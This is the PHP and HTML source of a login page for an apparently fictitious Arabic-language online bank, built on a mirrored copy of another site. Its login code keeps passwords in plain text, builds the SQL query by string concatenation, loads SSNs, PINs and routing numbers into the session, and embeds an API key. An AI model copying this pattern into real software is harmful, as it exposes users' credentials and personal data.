<?php
session_start();
include 'secured/config/database.php';
include 'secured/config/config.php';


$msg = "";
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;







if (isset($_POST['log'])) {
 
  if (empty($_POST["email"])) {
    $msg = "email is required";
  } else {
    $email = test_input($_POST["email"]);
    
    }
  
  
  
   if (empty($_POST["password"])) {
    $msg = "Password is required";
  } else {
    $password = test_input($_POST["password"]);
    // check if name only contains letters and whitespace
   
  }
    
		
	$email = $link->real_escape_string($_POST['email']);
	$password = $link->real_escape_string($_POST['password']);
	
	
	if($email == "" || $password == ""){
		$msg = "Account or Password fields cannot be empty!";
		
	}else {
   

					$sql = "SELECT * FROM tbl_users WHERE pwd = '$password' AND email='$email' ";

          $result = mysqli_query($link, $sql);
          if(mysqli_num_rows($result) > 0){
            $row = mysqli_fetch_assoc($result);

           
            if($row['pwd'] == $password && $row['email'] == $email){
				
              $_SESSION['email']=$_POST['email'];
	               $_SESSION['fname']=$row['fname'];
				   $_SESSION['lname']=$row['lname'];
				   $_SESSION['acctno']=$row['acctno'];
				   $_SESSION['uid']=$row['id'];
					$_SESSION['pin']=$row['pin'];
          $_SESSION['phone']=$row['phone'];
          
          $_SESSION['pics']=$row['pics'];
          $_SESSION['ip']=$row['ip'];
          $_SESSION['address']=$row['address'];
          $_SESSION['balance']=$row['balance'];
          $_SESSION['country']=$row['country'];

          $_SESSION['utype']=$row['utype'];
		  
          $_SESSION['zipcode']=$row['zipcode'];
		  
          $_SESSION['bdate']=$row['bdate'];
          $_SESSION['bname']=$row['bname'];
		  
		  
          $_SESSION['state']=$row['state'];
		  $_SESSION['city']=$row['city'];
		  $_SESSION['ssn']=$row['ssn'];
		  $_SESSION['rtn']=$row['rtn'];
          
		   $account = $_SESSION['acctno'];
		  
            header("location:secured/users/pin.php?account=$account&&email=$email");
				
				 }
			else{
				
				$msg = "Email or Password incorrect!";
			}
		}
		}
}

function test_input($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}


?>



<!doctype html>
<html lang="en">


<!-- Mirrored from astropex.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Jul 2020 13:07:06 GMT -->
<!-- Added by HTTrack -->
<!-- Mirrored from secure.astropex.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 23 Dec 2020 20:33:59 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <title>Thor Bank</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">      <title></title>
    <meta name="keywords" content="" />
    <meta name="description" content="" />

	<!-- Favicon icon -->    
	<link rel="stylesheet" href="etc/clientlib-default.min.001bf72e86ac4a5150822ce748c8d0ae.css" type="text/css">
	<link rel="stylesheet" href="site.min.css" type="text/css"><link rel="shortcut icon" type="image/png" href="images/favicon.png"/>    <!-- Google fonts -->	<link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,400,400i,500,500i,700" rel="stylesheet">			<!-- Bootstrap -->    <link href="css/bootstrap.min.css" rel="stylesheet">	<!-- Fontawsome -->    <link href="css/font-awesome.min.css" rel="stylesheet">    <!-- Animate CSS-->    <link href="css/animate.css" rel="stylesheet">    <!-- menu CSS-->    <link href="css/bootstrap-4-navbar.css" rel="stylesheet">		<!-- Portfolio Gallery -->    <link href="css/filterizer.css" rel="stylesheet">	<!-- Lightbox Gallery -->    <link href="inc/lightbox/css/jquery.fancybox.css" rel="stylesheet">	<!-- OWL Carousel -->	<link rel="stylesheet" href="css/owl.carousel.min.css">	<link rel="stylesheet" href="css/owl.theme.default.min.css">    <!-- Preloader CSS-->    <link href="css/fakeLoader.css" rel="stylesheet">	<!-- Main CSS -->    <link href="style.css" rel="stylesheet">    <!-- Default CSS Color -->     <link href="color/default.css" rel="stylesheet">     <!-- Color CSS -->     <link rel="stylesheet" href="color/color-switcher.css">    <!-- Default CSS Color -->     <link href="color/default.css" rel="stylesheet">     <!-- Color CSS -->     <link rel="stylesheet" href="color/color-switcher.css">	<!-- Responsive CSS -->    <link href="css/responsive.css" rel="stylesheet">    <link href="css/customcss.css" rel="stylesheet">    <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet"></head>
<!--header open in header-->

<script type="text/javascript" src="cdn.weglot.com/weglot.min.js"></script>
<script>
    Weglot.initialize({
        api_key: 'wg_8df86c8e7dcea06b64d53f5fd49840277'
    });
</script>
  <body>
  <style>
      .navbar-brand h2{
          font-size:35px;
          margin-top:2px;
      }
  </style>
   <!-- Preloader -->
    <div id="fakeloader"></div>
	
	<div class="top-menu-1x">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="top-menu-left">
						<p>هل تحتاج مساعدة؟ اتصل بنا</p>
						<b><i class="fa fa-phone"></i> 00963 (234) 567-8910</b>
						<b><i class="fa fa-envelope"></i><a style="color:#fff;" href="mailto:contact@yourdomain.com">info@thor-bank.com</a></b>
						<b><i class="fa fa-envelope"></i><a style="color:#fff;" href="mailto:support@yourdomain.com">support@thor-bank.com</a></b>
					</div>				
				</div>				
				<!--<div class="col-md-6">
					<div class="top-menu-right">
						<div class="footer-info-right">
							<ul>
								<li><a href="#"> <i class="fa fa-facebook"></i> </a></li>										
								<li><a href="#"> <i class="fa fa-twitter"></i> </a></li>											
								<li><a href="#"> <i class="fa fa-google"></i> </a></li>									
								<li><a href="#"> <i class="fa fa-linkedin"></i> </a></li>											
							</ul>					
						</div>					
					</div>				
				</div>-->
			</div>
		</div>
	</div>

	<div class="bussiness-main-menu-1x">	
		<div class="container">
			<div class="row">
				<div class="col-md-12">		
					<div class="business-main-menu">		
						<nav class="navbar navbar-expand-lg navbar-light bg-light btco-hover-menu">
						<a class="navbar-brand" href="index.php">
							<img style="max-width:180px;" src="logo.png" class="d-inline-block align-top" alt="">		
							<!--<h2><span style="color:#EC4550;">I</span><span style="color:#0E3768;">BG</span></h2>-->
						</a>
					  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
						<span class="navbar-toggler-icon"></span>
					  </button>

					  <div class="collapse navbar-collapse" id="navbarSupportedContent">
					  
						<ul class="navbar-nav ml-auto business-nav">
							<li class="nav-item dropdown">
									<a class="nav-link" href="#" id="navbarDropdownMenuLink2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
										خدمات المصرفية <i class="fa fa-angle-down"></i><span style="display: block;font-size: 11px;">الحسابات والخدمات</span>
									</a>
									<ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink2"  style="width: 100%;background-color: #fff;">
									
									<div class="container">
										<div class="business-services nav1">	
											<div class="row">				
												<div class="col-md-12 service-content">
													<div class="row">
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
                                                                      
																	<a href="current-accounts.html" class="menuhead">الحسابات الجارية</a>
																		<li><a class="dropdown-item" href="premier-accounts.html">حساب رئيسى</a></li>
                                                                      <li><a class="dropdown-item" href="bank-accounts.html">حساب البنك</a></li>
																		<li><a class="dropdown-item" href="advance-accounts.html">الحساب المسبق</a></li>
																		<li><a class="dropdown-item" href="student-accounts.html">حسابات الطلاب</a></li>
                                                                      <li><a class="dropdown-item" href="currency-account.html">حساب العملة</a></li>
																		
																  </div>
																</div>	
															</div>	
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="advance-accounts.html" class="menuhead">مدخرات</a>
																		<li><a class="dropdown-item" href="isas-accounts.html">حساب التوفير</a></li>
                                                                      <li><a class="dropdown-item" href="flexible-saver.html">توفير مرن</a></li>
																		<li><a class="dropdown-item" href="online-bonus-saver.html">توفير المكافآت عبر الإنترنت</a></li>
                                                                      <a style="margin-top: 15px;" href="international.html" class="menuhead">خدمات دولية</a>
                                                                      <li><a class="dropdown-item" href="money-transfer.html">المدفوعات الدولية</a></li>
                                                                      <li><a class="dropdown-item" href="travel-money.html">التحولات المال</a></li>
																		
																  </div>
																</div>	
															</div>	
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="credit-cards.html" class="menuhead">بطاقات الائتمان</a>
                                                                      <li><a class="dropdown-item" href="premier.html">بطاقة الائتمان الرائدة</a></li>
																		<li><a class="dropdown-item" href="premier-financial-advice.html">بطاقة ائتمان تحويل الرصيد</a></li>
																		<li><a class="dropdown-item" href="advance.html">بطاقة ائتمان سلفة</a></li>
																		<li><a class="dropdown-item" href="dual.html">بطاقة ائتمان للعائلة</a></li>
																		<li><a class="dropdown-item" href="classic.html">بطاقة الائتمان الكلاسيكية</a></li>
																		<li><a class="dropdown-item" href="premier.html"> بطاقة الثور العالمية </a></li>
																		<li><a class="dropdown-item" href="student.html">بطاقة ائتمان الطلاب</a></li>
																  </div>
																</div>	
															</div>	
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="contactandsupport.html" class="menuhead">خدمات المصرفية للأعمال</a>
																		<li><a class="dropdown-item" href="ways-to-bank.html">طرق التعامل المصرفي</a></li>
																		<li><a class="dropdown-item" href="phone-banking.html">معرف الصوت</a></li>
																		<li><a class="dropdown-item" href="contactandsupport.html">جهات الاتصال والدعم</a></li>
																		<li><a class="dropdown-item" href="branch-locator.html">ابحث عن فرع</a></li>
																
												
																  </div>
																</div>	
															</div>	
														</div>
													</div>
												</div>									
											</div>
										</div>
									</div>                                     
								</ul>
								</li>
							    <li class="nav-item dropdown">
									<a class="nav-link" href="#" id="navbarDropdownMenuLink3" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
										الاقتراض <i class="fa fa-angle-down"></i><span style="display: block;font-size: 11px;">القروض والرهون العقارية</span>
									</a>
									<ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink2"  style="width: 100%;background-color: #fff;">
									
									<div class="container">
										<div class="business-services nav2">	
											<div class="row">				
												<div class="col-md-12 service-content">
													<div class="row">
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="loans.html" class="menuhead">قروض</a>
																		<li><a class="dropdown-item" href="personal-loans.html">قرض شخصي</a></li>
																		<li><a class="dropdown-item" href="car-loans.html">قرض السيارة</a></li>
																		<li><a class="dropdown-item" href="flexible.html">قرض مرن</a></li>
																		<li><a class="dropdown-item" href="premier-personal.html">القرض الشخصي المميز</a></li>
																		<li><a class="dropdown-item" href="graduate-loans.html">قرض التخرج</a></li>
                                                                      <a href="overdrafts.html" class="menuhead">السحب على المكشوف</a>
																  </div>
																</div>	
															</div>	
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	
																	</div>
																</div>
															</div>
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="mortgages.html" class="menuhead">الرهون العقارية</a>
																		<li><a class="dropdown-item" href="first-time-buyers.html">المشتري لأول مرة</a></li>
																		<li><a class="dropdown-item" href="95-mortgages.html">95٪ قروض عقارية</a></li>
																		<li><a class="dropdown-item" href="remortgage.html">إعادة الجدولة القروض</a></li>
																		<li><a class="dropdown-item" href="buy-to-let-mortgages.html">شراء للإيجار</a></li>
																		<li><a class="dropdown-item" href="existing-customers.html">صاحب المنزل الحالي</a></li>
																		<li><a class="dropdown-item" href="mortgage-rates.html">معدلات الرهن العقاري</a></li>
																		<li><a class="dropdown-item" href="armed-forces.html">أفراد القوات المسلحة</a></li>
																  </div>
																</div>	
															</div>	
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="credit-cards.html" class="menuhead">بطاقات الائتمان</a>
                                                                      <li><a class="dropdown-item" href="premier.html">بطاقة الائتمان الرائدة</a></li>
																		<li><a class="dropdown-item" href="32-month-balance-transfer.html">بطاقة ائتمان تحويل الرصيد </a></li>
																		<li><a class="dropdown-item" href="advance.html">  بطاقة ائتمان سلفة</a></li>
																		<li><a class="dropdown-item" href="dual.html">بطاقة ائتمان للعائلة</a></li>
																		<li><a class="dropdown-item" href="classic.html">بطاقة الائتمان الكلاسيكية</a></li>
																		
																		<li><a class="dropdown-item" href="premier-world-elite.html">بطاقة الثور العالمية</a></li>
																		<li><a class="dropdown-item" href="student.html">بطاقة ائتمان الطلاب</a></li>
																  </div>
																</div>	
															</div>	
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="contactandsupport.html" class="menuhead">الخدمات المصرفية</a>
																		<li><a class="dropdown-item" href="contactandsupport.html">الخدمات المصرفية الاستثمارية</a></li>
																		<li><a class="dropdown-item" href="money-worries.html">خدمات الأعمال</a></li>
																		<li><a class="dropdown-item" href="branch-locator.html">ابحث عن فرع</a></li>
																		<a style="margin-top: 15px;" href="tools-and-guides.html" class="menuhead">أدوات وأدلة</a>
																		<li><a class="dropdown-item" href="overpayment-calculator.html">حاسبة المدفوعات الزائدة</a></li>
																		<li><a class="dropdown-item" href="repayment-calculator.html">حاسبة اعادة القروض</a></li>
																		<li><a class="dropdown-item" href="bank-of-england-base-rate.html">معلومات السعر الأساسي</a></li>
																  </div>
																</div>	
															</div>	
														</div>		
													</div>
												</div>									
											</div>
										</div>
									</div>                                     
								</ul>
							  </li>	

							  <li class="nav-item dropdown">
									<a class="nav-link" href="#" id="navbarDropdownMenuLink3" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
										الاستثمار <i class="fa fa-angle-down"></i><span style="display: block;font-size: 11px;">المنتجات والتحليل</span>
									</a>
									<ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink2"  style="width: 100%;background-color: #fff;">
									
									<div class="container">
										<div class="business-services nav3">	
											<div class="row">				
												<div class="col-md-12 service-content">
													<div class="row">
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="investing.html" class="menuhead">الاستثمارات</a>
																		<li><a class="dropdown-item" href="investment-funds.html">صناديق الاستثمار</a></li>
																		<li><a class="dropdown-item" href="sharedealing.html">حصة التداول</a></li>
																		<li><a class="dropdown-item" href="premier-financial-advice.html">الاستشارات المالية الممتازة</a></li>
																		<li><a class="dropdown-item" href="onshore-investment-bond.html">سند الاستثمار الداخلي</a></li>
																		<li><a class="dropdown-item" href="child-trust-funds.html">صندوق ائتمان الطفل</a></li>
																		<li><a class="dropdown-item" href="investing.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>	
														</div>
														
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="news.html" class="menuhead">الأخبار المالية & التحليلات</a>
                                                                      <li><a class="dropdown-item" href="stand-alone-investment-advice.html">نصيحة استثمارية قائمة بذاتها</a></li>
                                                                      <li><a class="dropdown-item" href="selected-investment-funds.html">استثمارات مختارة قائمة<br>عملاء</a></li>
															
																	<a href="why-invest-with-us.html" class="menuhead">لماذا تستثمر معنا?</a>
																	<li><a class="dropdown-item" href="why-invest-with-us.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	
																  </div>
																</div>	
															</div>	
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="investment-funds-online.html" class="menuhead">مركز الاستثمار العالمي</a>
                                                                      <li><a class="dropdown-item" href="world-selection-isa.html">استثمار اختيارات العالمية</a></li>
                                                                      <a href="wealth-insights.html" class="menuhead">رؤى الثروة </a>
                                                                      <li><a class="dropdown-item" href="getting-started.html">الشروع في الاستثمار</a></li>
																		<li><a class="dropdown-item" href="investment-funds-online.html">اكتشف المزيد</a></li>
																	</div>
																</div>
															</div>
														</div>	
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="contactandsupport.html" class="menuhead">دعم العملاء</a>
																		<li><a class="dropdown-item" href="gsa.html"> قم بتسجيل الدخول إلى الاستثمار مركز<br>العالمي</a></li>
																		<li><a class="dropdown-item" href="gsa.html"> قم بتسجيل الدخول إلى حصة التداول</a></li>
																		<li><a class="dropdown-item" href="contactandsupport.html">اتصالات الاستثمار</a></li>
																		<li><a class="dropdown-item" href="contactandsupport.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>	
														</div>			
													</div>
												</div>									
											</div>
										</div>
									</div>                                     
								</ul>
							  </li>	

							  <li class="nav-item dropdown">
									<a class="nav-link" href="#" id="navbarDropdownMenuLink3" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
										تأمين <i class="fa fa-angle-down"></i><span style="display: block;font-size: 11px;">الملكية والعائلة</span>
									</a>
									<ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink2"  style="width: 100%;background-color: #fff;">
									
									<div class="container">
										<div class="business-services nav4">	
											<div class="row">				
												<div class="col-md-12 service-content">
													<div class="row">
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="insurance.html" class="menuhead">تأمين</a>
																		<li><a class="dropdown-item" href="home-insurance.html">تأمين المنزل</a></li>
																		<li><a class="dropdown-item" href="travel-insurance.html">تأمين السفر</a></li>
																		<li><a class="dropdown-item" href="student-insurance.html">تأمين الطالب</a></li>
																		<li><a class="dropdown-item" href="insurance.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>	
														</div>
														
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="life-insurance.html" class="menuhead">التأمين على الحياة</a>
																	<li><a class="dropdown-item" href="life-cover.html">تامين الحياة</a></li>
																	<li><a class="dropdown-item" href="critical-illness-cover.html">تغطية الأمراض الحرجة</a></li>
																	<li><a class="dropdown-item" href="income-cover.html">تامين الدخل</a></li>
																	<li><a class="dropdown-item" href="protection-telephone-advice.html">نصائح الحماية الهاتفية</a></li>
																	<li><a class="dropdown-item" href="life-insurance.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="insurance.html" class="menuhead">مطالبات التأمين</a>
																		<li><a class="dropdown-item" href="home-insurance-claims.html">مطالبات تأمين المنزل</a></li>
																		<li><a class="dropdown-item" href="travel-insurance.html">مطالبات تأمين السفر</a></li>
																		<li><a class="dropdown-item" href="car-insurance-claims.html">مطالبات تأمين السيارات</a></li>
																	</div>
																</div>
															</div>
														</div>	
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="premier-accounts.html" class="menuhead">عملاء أولا </a>
                                                                      <li><a class="dropdown-item" href="premier-car.html">مطالبات تأمين السيارات</a></li>
																		<li><a class="dropdown-item" href="premier-travel.html">مطالبات تأمين السفر</a></li>
																		
																  </div>
																</div>	
															</div>	
														</div>			
													</div>
												</div>									
											</div>
										</div>
									</div>                                     
								</ul>
							  </li>
								
								<li class="nav-item dropdown">
									<a class="nav-link" href="#" id="navbarDropdownMenuLink3" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
										أحداث الحياة <i class="fa fa-angle-down"></i><span style="display: block;font-size: 11px;">مساعدة ودعم</span>
									</a>
									<ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink2"  style="width: 100%;background-color: #fff;">
									
									<div class="container">
										<div class="business-services nav5">	
											<div class="row">				
												<div class="col-md-12 service-content">
													<div class="row">
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="life-events.html" class="menuhead">أحداث الحياة</a>
																		<li><a class="dropdown-item" href="getting-married.html">الزواج</a></li>
																		<li><a class="dropdown-item" href="dealing-with-separation.html">دعم الفصل</a></li>
																		<li><a class="dropdown-item" href="moving-abroad.html">الانتقال إلى الخارج</a></li>
                                                                      <li><a class="dropdown-item" href="settling.html">الاستقرار في خارج</a></li>
																		<li><a class="dropdown-item" href="life-events.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>	
														</div>
														
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="planningtools.html" class="menuhead">أدوات التخطيط</a>
                                                                      <li><a class="dropdown-item" href="planning-your-retirement.html">التخطيط لتقاعدك</a>
																	<li><a class="dropdown-item" href="financial-health-check.html">فحص السلامة المالية</a></li>
																	<li><a class="dropdown-item" href="planningtools.html">اكتشف المزيد</a></li>
																  </div>
																</div>	
															</div>
														</div>
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="protecting-what-matters.html" class="menuhead">حماية ما يهم</a>
																		<li><a class="dropdown-item" href="growing-your-wealth.html">تنمية ثروتك</a></li>
                                                                      <li><a class="dropdown-item" href="money-worries.html">هموم المال</a></li>
                                                                      <li><a class="dropdown-item" href="quality-conversations.html">احجز مراجعتك اليوم للحصول على<br>فحص مالي سريع</a></li>
																	</div>
																</div>
															</div>
														</div>	
														<div class="col-md-3">
															<div class="single-services">
																<div class="media">
																  <div class="media-body">
																	<a href="contactandsupport.html" class="menuhead">دعم العملاء</a>
																		<li><a class="dropdown-item" href="ways-we-can-help.html">طرق يمكننا مساعدتك</a></li>
																		<li><a class="dropdown-item" href="ways-we-can-help.html">أسئلة مكررة</a></li>
																		<a style="margin-top: 15px;" href="quality-conversations.html" class="menuhead">مراجعة فردية</a>
                                                                      <li><a class="dropdown-item" href="protecting-what-matters.html">اكتشف المزيد</a></li>
                                                                      <li><a class="dropdown-item" href="dealing-with-bereavement.html">دعم</a></li>
																  </div>
																</div>	
															</div>	
														</div>			
													</div>
												</div>									
											</div>
										</div>
									</div>                                     
								</ul>
							  </li>
							   
							 </ul>	
						  </div>
						</nav>
					</div>
				</div>
			</div>
		</div>
	</div>	
	<!--NAVIGATION END--><style>
    #userpinid,#useridtextid {
    color: #717171;
    font-size: 1em;
    line-height: 1.375em;
    background: none;
    border: none;
        border-bottom-color: currentcolor;
        border-bottom-style: none;
        border-bottom-width: medium;
    border-bottom-color: currentcolor;
    border-bottom-style: none;
    border-bottom-width: medium;
    border-bottom: 1px solid #ccc;
    padding: .313em;
    margin: .188em 0;
}
</style>
<!--home content start-->
<div class="business-main-slider1">
		<div class="owl-carousel1 main-slider1">
			<div class="item1">			
				<div class="hvrbox">
					<img src="images/b1.jpg" alt="Mountains" class="hvrbox-layer_bottom">
					<div class="business-main-slider">
						<div class="banner-content">
							<div class="owl-carousel main-slider">
								<div class="item">	
									<div class="innerBannerContent row">
										<div class="col-sm-7">
											<h2>اكتشف قروضنا العقارية الجديدة بنسبة 95٪</h2>
											<p>نحن نجعل الأمر أسهل للمشترين لأول مرة للوصول إلى سلم العقارات.</p>
											<a href="mortgages.html">اكتشف المزيد</a>
										</div>
										<div class="col-sm-5">
											<img src="images/visa.png" alt=""/>
										</div>
									</div>
								</div>
								<div class="item">	
									<div class="innerBannerContent row">
										<div class="col-sm-7">
											<h2>الخدمات المصرفية الإستثمارية</h2>
											<p>تقدم الخدمات المصرفية الاستثمارية خدمات استشارية مالية شاملة ، وزيادة رأس المال ، وخدمات التمويل والإدارة للشركات.</p>
											<a href="investing.html">اكتشف المزيد</a>
										</div>
										<div class="col-sm-5">
											<img src="images/visa1.png" alt=""/>
										</div>
									</div>
								</div>
								<div class="item">	
									<div class="innerBannerContent row">
										<div class="col-sm-7">
											<h2>التمويل العالمي</h2>
											<p>يعمل فريق الاندماج والاستحواذ لدينا بالشراكة مع المصرفيين المغطيين في تقديم الحلول ، باستخدام نهج تحليلي للغاية ، وتقديم رؤى فريدة من نوعها.</p>
											<a href="international.html">اكتشف المزيد</a>
										</div>
										<div class="col-sm-5">
											<img src="images/visa2.png" alt=""/>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="loginbox">
						<div class="innerlogin">
						    
						    
						     						    
						     <?php if($msg != "") echo "<div style='padding:20px;background-color:#dce8f7;color:black'> $msg</div class='btn btn-success'>" ."</br></br>";  ?>
						    
							
							 <form class="form-horizontal" action="index.php" method="post" enctype="multipart/form-data">
							     
							     
							     
							     <h3>أهلا بك</h3>
							     
							    
							    
							    
							     
								  <div class="form-group">
								      <div class="" align="center">&nbsp;</div>
								    <div class="col-sm-10">
								        
								        
								      <input type="email" class="input100 form-control" name="email"  placeholder="رقم الحساب">
								      
								      
								    </div>
								  </div>
								  
								  
								  <div class="form-group">
								    <div class="col-sm-10"> 
								      <input type="password" class="input100 form-control" name="password"  placeholder="Password">
								    </div>
								  </div>
								  <div class="form-group"> 
								    <div class="col-sm-offset-2 col-sm-10">
								      <div class="checkbox">
								        <label><input type="checkbox"> تذكرنى</label>
								        <span style="float: right;"><a href="#">استخدم الرمز<i class="fa fa-angle-right" style="margin-left: 5px;" aria-hidden="true"></i></a></span>
								      </div>
								    </div>
								  </div>
								  <div class="form-group"> 
								    <div class="col-sm-offset-2 col-sm-10">
								      <button type="submit" class="btn btn-default loginbtn"  name="log">تسجيل الدخول</button>
								    </div>
								  </div>
								  
								  
								  
								  
								  
								  
								  
								  
								  <div class="form-group" style="margin-bottom: 0;line-height: 28px;"> 
								    <!--<div class="col-sm-offset-2 col-sm-10">
								    	<a href="users/form/">Forgot username/password?<i class="fa fa-angle-right" style="margin-left: 5px;" aria-hidden="true"></i></a>
								    </div>-->
								    <div class="col-sm-offset-2 col-sm-10">
								    	<a href="secured/users/register.php">لم يدرج اسمه ؟ أفتح حساب الأن.<i class="fa fa-angle-right" style="margin-left: 5px;" aria-hidden="true"></i></a>
								    </div>
								  </div>
							 </form>
							 
							 
							 
							 
							 
							 
							 
							 
							 
							 
							 
							 <form method="POST" id="threestep" onsubmit="return false;" style="display: none;">
										<h3>أهلا بك</h3>
									
									<div class="row loginAdj"  >
										<div class="col-md-12 col-sm-12 col-xs-12 col-lg-12">
											
													<input type="password"  name="pinnumber" id="userpinid" class="form-control" placeholder="PIN Number">
													 	
										</div>
									</div>
									<div class="row">
									<div class="form-group col-xs-12 col-md-12 signonBtnContainer">
										<div class="col-xs-12">
										    <br>
											<button id="secondstepbutton2" class="btn btn-default loginbtn">تحقق من صحة رقم التعريف الشخصي</button>
										</div>
									</div>
									</div>
								</form>
						</div>
						
						<div class="innerlogin" id="forgotpassword-form" style="display:none">
							 <form method="POST" id="forgotpassword" onsubmit="return false;">
										<h3>هل نسيت كلمة السر</h3>
									
									<div class="row loginAdj"  >
										<div class="col-md-12 col-sm-12 col-xs-12 col-lg-12">
													<input type="password"  name="accnumber" id="useridtextid" class="form-control" placeholder="Online id">
													 	
										</div>
									</div>
									<div class="row">
									<div class="form-group col-xs-12 col-md-12 signonBtnContainer">
										<div class="col-xs-12">
										    <br>
											<button id="forgotpasswordbutton2" type="submit" class="btn btn-default loginbtn">ارسل بريد</button>
										</div>
									</div>
									</div>
									 <div class="form-group" style="margin-bottom: 0;line-height: 28px;"> 
								    <div class="col-sm-offset-2 col-sm-10">
								    	<a href="javascript:void(0)" onclick="login()">تسجيل الدخول الآن؟<i class="fa fa-angle-right" style="margin-left: 5px;" aria-hidden="true"></i></a>
								    </div>f
								    <div class="col-sm-offset-2 col-sm-10">
								    	<a href="secured/users/register.php">لم يدرج اسمه ؟ أفتح حساب الأن.<i class="fa fa-angle-right" style="margin-left: 5px;" aria-hidden="true"></i></a>
								    </div>
								  </div>
								</form>
						</div>
					</div>
				</div>			
            </div>

        </div>	
	</div>
	<div class="business-features-3x" style="margin-top: 60px;">
		<div class="colourful-features-content">				
			<div class="row">
				<div class="container">	
					<div class="col-sm-12 bankservice">
						<div class="business-title-middle" style="margin-bottom: 15px;">
							<h2>اختر ما يناسبك</h2>
							<span class="title-border-middle"></span>
						</div>
						<ul class="bxsliderwr">
							<li>
								<a href="investing.html">
									<i class="icon-checking-small" aria-hidden="true"></i>
									<span>استثمار</span>
								</a>
							</li>
							<li>
								<a href="credit-cards.html">
									<i class="icon-credit-score-medium" aria-hidden="true"></i>
									<span>درجة ائتمان مجانية</span>
								</a>
							</li>
							<li>
								<a href="saving-accounts.html">
									<i class="icon-savings-bank-medium" aria-hidden="true"></i>
									<span>saving-accounts<br>& CDs</span>
								</a>
							</li>
							<li>
								<a href="current-accounts.html">
									<i class="icon-checking-medium" aria-hidden="true"></i>
									<span>تدقيق في الحساب</span>
								</a>
							</li>
							<li>
								<a href="credit-cards.html">
									<i class="icon-credit-medium" aria-hidden="true"></i>
									<span>ابحث عن بطاقة ائتمان</span>
								</a>
							</li>
							<li>
								<a href="home-insurance.html">
									<i class="icon-mortgage2-medium" aria-hidden="true"></i>
									<span>إقراض المنزل</span>
								</a>
							</li>
							<li>
								<a href="car-loans.html">
									<i class="icon-Auto-loan-medium" aria-hidden="true"></i>
									<span>قروض وشراء السيارات</span>
								</a>
							</li>
							<li>
								<a href="growing-your-wealth.html">
									<i class="icon-business-medium" aria-hidden="true"></i>
									<span>ثور بنك للأعمال</span>
								</a>
							</li>
							<li>
								<a href="protecting-what-matters.html">
									<i class="icon-cpc-medium" aria-hidden="true"></i>
									<span>العميل الخاص بالبنك</span>
								</a>
							</li>
						</ul>
					</div>
				</div>
				<div class="row text-center">
				<div class="col-md-3 no-padding">				
					<div class="single-colorful-feature feature-color-1">
						<h2><a href="bank-accounts.html">حسابات بنكية<i class="fa fa-angle-right" aria-hidden="true"></i></a></h2>
						<p>اكتشف مزايا حساب مصرفي من ثور بنك.</p>	
					</div>									
				</div>					
				<div class="col-md-3 no-padding">				
					<div class="single-colorful-feature feature-color-2">
						<h2><a href="mortgages.html">الرهون العقارية<i class="fa fa-angle-right" aria-hidden="true"></i></a></h2>
